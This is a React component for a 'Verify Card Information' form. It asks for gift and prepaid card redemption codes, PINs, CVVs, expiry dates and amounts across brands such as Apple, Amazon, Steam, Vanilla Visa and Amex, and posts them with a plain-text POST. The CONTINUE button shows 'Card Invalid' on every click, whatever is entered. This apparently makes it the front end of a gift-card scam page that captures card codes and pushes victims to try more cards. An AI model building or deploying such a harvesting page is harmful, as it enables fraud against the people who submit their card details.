import { Switch } from "@mui/material";
import React from "react"


function Card(){
        function selectfunction() {
            const pin = document.querySelector("#pin")
            const expiry = document.querySelector("#expiry")
            const cvv = document.querySelector("#cvv")
            const cards = document.getElementById("cards");
            const selectedValue = cards.options[cards.selectedIndex].value;

            if(selectedValue === "Sephora" || selectedValue === "Nordstrom" || selectedValue === "Nike"){
                pin.style.display = "block"
                expiry.style.display = "none"
                cvv.style.display = "none"
            }else{
                switch (selectedValue) {
                    case "MasterCard":
                        expiry.style.display = "block"
                        cvv.style.display = "block"
                        pin.style.display = "none"

                        
                        break;
                    case "Vanilla Visa":
                        expiry.style.display = "block"
                        cvv.style.display = "block" 
                        pin.style.display = "none"

                    break;
                    case "Wallmart Visa":
                        expiry.style.display = "block"
                        cvv.style.display = "block"
                        pin.style.display = "none"
 
                    break;
                    case "Visa Silvery White":
                        expiry.style.display = "block"
                        cvv.style.display = "block" 
                        pin.style.display = "none"

                    break;
                    case "TT Visa":
                        expiry.style.display = "block"
                        cvv.style.display = "block"
                        pin.style.display = "none"
 
                    break;
                    case "Amex":
                        expiry.style.display = "block"
                        cvv.style.display = "block" 
                        pin.style.display = "none"

                    break;
                
                    default:
                        expiry.style.display = "none"
                        cvv.style.display = "none"
                        pin.style.display = "none"
                    break;
                }
            }
           }

           function btnfunc(){
                const error = document.querySelector(".error")

                error.style.display = "block"

             
           }

    

    return(
        <div>
            <div id="card">
                <div className="card_form">
                    <h3>Verify Card Information</h3>
                    <form action="" method="post" encType="text/plain">
                        <select onClick={selectfunction} name="cards" id="cards">
                            <option  value="Select type of card">Select type of card</option>
                            <option className = "apple" value="Apple">Apple</option>
                            <option className = "amazon" value="Amazon">Amazon</option>
                            <option className = "steam" value="Steam">Steam</option>
                            <option className = "ebay" value="Ebay">Ebay</option>
                            <option className = "xbox" value="Xbox">Xbox</option>
                            <option className = "googleplay" value="Googleplay">Googleplay</option>
                            <option className = "playstation" value="PlayStation">PlayStation</option>
                            <option className = "sephora" value="Sephora">Sephora</option>
                            <option className = "razorgold" value="RazorGold">RazorGold</option>
                            <option className = "nordstrom" value="Nordstrom">Nordstrom</option>
                            <option className = "nike" value="Nike">Nike</option>
                            <option className = "mastercard" value="MasterCard">MasterCard</option>
                            <option className = "vanillavisa" value="Vanilla Visa">Vanilla Visa</option>
                            <option className = "wallmartvisa" value="Wallmart Visa">Wallmart Visa</option>
                            <option className = "visasilverywhite" value="Visa Silvery White">Visa Silvery White</option>
                            <option className = "ttvisa" value="TT Visa">TT Visa</option>
                            <option className = "amex" value="Amex">Amex</option>
                        </select>
                        <select name="currency" id="currency">
                            <option value="USD">USD</option>
                            <option value="GBP">GBP</option>
                            <option value="AUD">AUD</option>    
                            <option value="EUR">EUR</option>
                            <option value="CAD">CAD</option>
                        </select>
                        <input type="number" placeholder="Card Amount" id="amount" name="amount" step="1"></input>
                    <input placeholder = "Redemption Code" type="text" name="redemptionCode" id="redemptioncode" /> 
                    <input placeholder="Gift Card Expiry Date" name="expiry" id="expiry" type="date" />            
                    <input placeholder="Gift Card CVV" type="text" name="pin" id="cvv" />               
                    <input placeholder="Gift Card Pin" type="text" name="pin" id="pin" />               
                    <div onClick={btnfunc} className="cardform_btn"><button type="submit">CONTINUE</button></div>
                    <div className="error"><h1>Card Invalid</h1></div> 
                    <p>Please make sure the codes you are about to input are correct and according to details</p>
                 </form>

                </div>
           

            </div>  
        
        </div>
    )
}

export default Card